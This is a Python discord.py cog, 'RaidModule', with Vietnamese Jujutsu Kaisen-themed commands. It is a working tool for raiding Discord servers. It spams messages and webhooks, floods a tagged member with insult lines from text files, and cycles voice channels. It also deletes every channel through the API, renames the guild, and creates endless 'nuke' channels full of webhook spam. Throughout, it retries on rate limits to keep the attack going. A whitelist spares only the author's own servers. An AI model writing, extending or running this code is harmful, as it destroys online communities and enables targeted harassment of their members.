import discord
from discord.ext import commands
import asyncio
import random
import aiohttp
import os
import pickle

from rate_utils import (
    PROTECTED_GUILD_IDS,
    MIN_SPAM_DELAY,
    MIN_WEBHOOK_DELAY,
    MIN_VOICE_DELAY,
    handle_429_response,
    wait_off_429,
    delete_channel_via_api,
)

class RaidModule(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.is_war = False
        self.api_semaphore = asyncio.BoundedSemaphore(4)

    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        if ctx.command is None:
            return

        if isinstance(error, commands.CommandInvokeError) and error.original is not None:
            error = error.original

        if isinstance(error, (commands.MissingRequiredArgument, commands.BadArgument, commands.UserInputError, commands.CommandOnCooldown)):
            await ctx.send(f"❌ Lỗi lệnh: {error}", delete_after=5)
            return

        if isinstance(error, commands.CommandNotFound):
            return

        await ctx.send(f"❌ Lỗi: {error}", delete_after=5)

    async def handle_rate_limit(self, response):
        """Back off on Discord 429 responses instead of spamming the API."""
        return await handle_429_response(response)

    # ================= MENU HỆ THỐNG (ANSI JJK) =================

    @commands.command(name="raid")
    async def _raid_menu(self, ctx):
        p = self.bot.command_prefix
        menu = f"""```ansi
\033[1;31m⚔️ DOMAIN EXPANSION: CHIẾN TRANH ⚔️\033[0m
\033[1;37m**Chọn thuật thức tấn công:**\033[0m

\033[1;35m⚡ SPAM (100 tin)\033[0m
\033[1;30m  {p}vohahan [delay] [text]  \033[1;30m- Spam tùy chỉnh\033[0m
\033[1;30m  {p}thuong [delay]         \033[1;30m- Spam ngon.txt\033[0m
\033[1;30m  {p}lienke [delay] [@tag]  \033[1;30m- Spam nhay.txt\033[0m
\033[1;30m  {p}hacmon [url] [d] [t]  \033[1;30m- Webhook spam\033[0m

\033[1;34m🔊 VOICE\033[0m
\033[1;30m  {p}ngucmon [id]           \033[1;30m- Treo Voice\033[0m
\033[1;30m  {p}loanvuc [id] [d]      \033[1;30m- Spam join/leave\033[0m

\033[1;31m🧨 DESTROY\033[0m
\033[1;30m  {p}khaitram              \033[1;30m- Xóa kênh\033[0m
\033[1;30m  {p}huydiet               \033[1;30m- Nuke server\033[0m
\033[1;30m  {p}anpham [so] [emoji]   \033[1;30m- Reaction spam\033[0m

\033[1;33m⚠️ Gõ {p}ngung để dừng tất cả!\033[0m
```"""
        await ctx.send(menu)

    # ================= LÕI THỰC THI (LOGIC NÂNG CẤP) =================

    @commands.command(name="vohahan")
    async def _vohahan(self, ctx, delay: float = 0, *, content):
        """[Vô Hạn] Spam nội dung bất kỳ - 100 dong"""
        self.is_war = True
        count = 0
        max_lines = 100
        while self.is_war and count < max_lines:
            try:
                # Auto-giam dong neu qua 2000 ky tu
                msg = content[:1990] if len(content) > 1990 else content
                await ctx.send(msg)
                count += 1
                if delay > 0:
                    await asyncio.sleep(delay)
            except discord.HTTPException as e:
                if getattr(e, "status", None) == 429:
                    await wait_off_429(e)
                    continue
                break
            except Exception:
                break
        await ctx.send(f"✅ **Vô Hạn** hoan tat! Da gui `{count}` tin nhan.", delete_after=5)

    @commands.command(name="thuong")
    async def _thuong(self, ctx, delay: float = 0):
        """[Thương] Nhây ngôn từ từ file ngon.txt - 100 dong"""
        if not os.path.exists("ngon.txt"):
            return await ctx.send("❌ Thiếu chú vật `ngon.txt`!", delete_after=5)
        
        self.is_war = True
        try:
            with open("ngon.txt", "r", encoding="utf-8") as f:
                content = [line.strip() for line in f.readlines() if line.strip()]
            
            if not content:
                return await ctx.send("❌ File `ngon.txt` trống rỗng!", delete_after=5)
            
            count = 0
            max_lines = 100
            while self.is_war and count < max_lines:
                try:
                    msg = random.choice(content)[:1990]
                    await ctx.send(msg)
                    count += 1
                except discord.HTTPException as e:
                    if getattr(e, "status", None) == 429:
                        await wait_off_429(e)
                        continue
                    break
                if delay > 0:
                    await asyncio.sleep(delay)
            await ctx.send(f"✅ **Thương** hoan tat! Da gui `{count}` tin nhan.", delete_after=5)
        except Exception as e:
            print(f"Lỗi thuật thức Thương: {e}")

    @commands.command(name="lienke")
    async def _lienke(self, ctx, delay: float = 0, member: discord.Member = None):
        """[Liên Kế] Nhây lầy từ file nhay.txt - 100 dong"""
        if not os.path.exists("nhay.txt"):
            return await ctx.send("❌ Thiếu chú vật `nhay.txt`!", delete_after=5)

        self.is_war = True
        try:
            with open("nhay.txt", "r", encoding="utf-8") as f:
                content = [line.strip() for line in f.readlines() if line.strip()]
            
            if not content:
                return await ctx.send("❌ File `nhay.txt` trống rỗng!", delete_after=5)
            
            count = 0
            max_lines = 100
            while self.is_war and count < max_lines:
                msg = random.choice(content)
                target = f"{member.mention} " if member else ""
                full_msg = f"{target}{msg}"[:1990]
                try:
                    await ctx.send(full_msg)
                    count += 1
                except discord.HTTPException as e:
                    if getattr(e, "status", None) == 429:
                        await wait_off_429(e)
                        continue
                    break
                if delay > 0:
                    await asyncio.sleep(delay)
            await ctx.send(f"✅ **Liên Kế** hoan tat! Da gui `{count}` tin nhan.", delete_after=5)
        except Exception as e:
            print(f"Lỗi thuật thức Liên Kế: {e}")

    @commands.command(name="ngung")
    async def _stop(self, ctx):
        """Giải ấn - Dừng toàn bộ thuật thức mạnh hơn"""
        self.is_war = False

        for vc in list(self.bot.voice_clients):
            if vc.guild == ctx.guild and vc.is_connected():
                try:
                    await vc.disconnect()
                except Exception:
                    pass

        await ctx.send("🤞 **GIẢI ẤN!** Tất cả thuật thức đã bị thu hồi.", delete_after=5)

    @commands.command(name="hacmon")
    async def _hacmon(self, ctx, url: str, delay: float = 0, *, text: str):
        """[Hắc Môn] Spam qua Webhook với delay tùy chỉnh"""
        self.is_war = True
        async with aiohttp.ClientSession() as session:
            try:
                webhook = discord.Webhook.from_url(url, session=session)
                while self.is_war:
                    try:
                        await webhook.send(content=text)
                    except discord.HTTPException as e:
                        if getattr(e, "status", None) == 429:
                            await wait_off_429(e)
                            continue
                        raise
                    if delay > 0:
                        await asyncio.sleep(delay)
            except Exception as e:
                print(f"Lỗi Hắc Môn: {e}")
                self.is_war = False

    @commands.command(name="ngucmon")
    async def _ngucmon(self, ctx, id_voice: int):
        """[Ngục Môn] Treo hồn trong Voice Channel"""
        voice_channel = self.bot.get_channel(id_voice)
        if not voice_channel or not isinstance(voice_channel, discord.VoiceChannel):
            return await ctx.send("❌ Không tìm thấy tọa độ Voice!", delete_after=3)
        
        try:
            await voice_channel.connect(reconnect=True)
            await ctx.send(f"👁️ **Ngục Môn Cương!** Đã phong ấn tại: `{voice_channel.name}`", delete_after=5)
        except Exception as e:
            await ctx.send(f"❌ Thuật thức thất bại: {e}", delete_after=3)

    @commands.command(name="loanvuc")
    async def _loanvuc(self, ctx, id_voice: int, delay: float = 0):
        """[Loạn Vực] Liên tục vào và rời khỏi Voice Channel"""
        voice_channel = self.bot.get_channel(id_voice)
        if not voice_channel:
            return await ctx.send("❌ Lỗi tọa độ Voice!", delete_after=5)
        
        self.is_war = True
        await ctx.send(f"🌀 **LOẠN VỰC KHAI TRIỂN!** `{voice_channel.name}`", delete_after=5)
        
        while self.is_war:
            try:
                vc = await voice_channel.connect()
                if delay > 0:
                    await asyncio.sleep(delay)
                await vc.disconnect()
                if delay > 0:
                    await asyncio.sleep(delay)
            except Exception:
                break

    @commands.command(name="anpham")
    async def _anpham(self, ctx, limit: int, emoji: str):
        """[Ấn Phẩm] Tự động thả cảm xúc (reaction) hàng loạt tin nhắn"""
        count = 0
        async for message in ctx.channel.history(limit=limit):
            try:
                await message.add_reaction(emoji)
                count += 1
            except discord.HTTPException as e:
                if getattr(e, "status", None) == 429:
                    await wait_off_429(e)
                continue
            except Exception:
                continue
        await ctx.send(f"✅ **Ấn Phẩm** đã đóng dấu `{count}` tin nhắn!", delete_after=3)

    @commands.command(name="khaitram")
    async def _khaitram(self, ctx):
        """[Khai Trảm] Xóa toàn bộ kênh trong server cực nhanh qua API"""
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Whitelist bảo vệ!**", delete_after=3)

        channels = [channel.id for channel in ctx.guild.channels]
        
        if not os.path.exists("trash"):
            os.makedirs("trash")
        with open("trash/channel_ids.pkl", 'wb') as f:
            pickle.dump(channels, f)

        await ctx.send("🛠️ **Khai Trảm!** San phẳng kết giới...", delete_after=5)
        
        async with aiohttp.ClientSession() as session:
            tasks = [delete_channel_via_api(session, c_id, self.bot.http.token, self.api_semaphore) for c_id in channels]
            await asyncio.gather(*tasks)

    async def read_nhay_lines(self):
        if not os.path.exists("nhay.txt"):
            return []
        with open("nhay.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f.readlines() if line.strip()]

    async def send_channel_nhay(self, channel, lines, delay):
        for i in range(100):
            if not self.is_war:
                break
            content = lines[i % len(lines)]
            try:
                await channel.send(content)
            except discord.HTTPException as e:
                if getattr(e, "status", None) == 429:
                    await wait_off_429(e)
                    continue
                break
            except Exception:
                break

    async def send_webhook_nhay(self, webhook, lines, delay):
        for i in range(100):
            if not self.is_war:
                break
            content = lines[i % len(lines)]
            try:
                await webhook.send(content=content)
            except discord.HTTPException as e:
                if getattr(e, "status", None) == 429:
                    await wait_off_429(e)
                    continue
                break
            except Exception:
                break

    async def delete_channel_api(self, session, channel_id):
        await delete_channel_via_api(session, channel_id, self.bot.http.token, self.api_semaphore)

    @commands.command(name="huydiet")
    async def _huydiet(self, ctx, webhook_url: str = None, delay: float = 0):
        """[Hủy Diệt] Nuke server hoặc spam nhay.txt khi không có webhook/quyền"""
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Whitelist bảo vệ!**", delete_after=3)

        self.is_war = True
        lines = await self.read_nhay_lines()
        if not lines:
            return await ctx.send("❌ Thiếu file `nhay.txt` hoặc file trống!", delete_after=5)

        can_manage_channels = ctx.guild.me.guild_permissions.manage_channels
        can_manage_webhooks = ctx.guild.me.guild_permissions.manage_webhooks
        use_webhook_mode = False

        if webhook_url and can_manage_channels and can_manage_webhooks:
            try:
                async with aiohttp.ClientSession() as session:
                    webhook = discord.Webhook.from_url(webhook_url, session=session)
                    await webhook.send(content="🔪 Khởi động Hủy Diệt...", wait=True)
                    use_webhook_mode = True
            except Exception:
                use_webhook_mode = False

        if not use_webhook_mode:
            await ctx.send("⚠️ Không có webhook hợp lệ hoặc thiếu quyền. Bắt đầu spam `nhay.txt` vào tất cả kênh...", delete_after=5)
            text_channels = [ch for ch in ctx.guild.channels if isinstance(ch, discord.TextChannel)]
            for channel in text_channels:
                if not self.is_war:
                    break
                await self.send_channel_nhay(channel, lines, delay)
            return await ctx.send("✅ **Spam `nhay.txt` hoàn tất vòng 100 dòng trên mỗi kênh.**", delete_after=5)

        guild = ctx.guild
        random_suffix = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=6))
        try:
            await guild.edit(name=f"nukesv-{random_suffix}")
        except Exception:
            pass

        await ctx.send("🛠️ Đang xóa kênh cũ và tạo kết giới mới...", delete_after=5)
        channel_ids = [channel.id for channel in guild.channels if channel != ctx.channel]
        async with aiohttp.ClientSession() as session:
            for ch_id in channel_ids:
                if not self.is_war:
                    break
                await self.delete_channel_api(session, ch_id)

        await ctx.send("🛠️ **Đã san phẳng kết giới.** Bắt đầu tạo kênh `nuke-*` và spam `nhay.txt`...", delete_after=5)

        channel_index = 1
        while self.is_war:
            try:
                new_channel = await guild.create_text_channel(name=f"nuke-{channel_index}")
            except Exception:
                break

            try:
                webhook = await new_channel.create_webhook(name="Sukuna_Nuke")
            except Exception:
                channel_index += 1
                continue

            await self.send_webhook_nhay(webhook, lines, delay)
            channel_index += 1

        await ctx.send("🧨 **Hủy Diệt hoàn tất!**", delete_after=5)

async def setup(bot):
    await bot.add_cog(RaidModule(bot))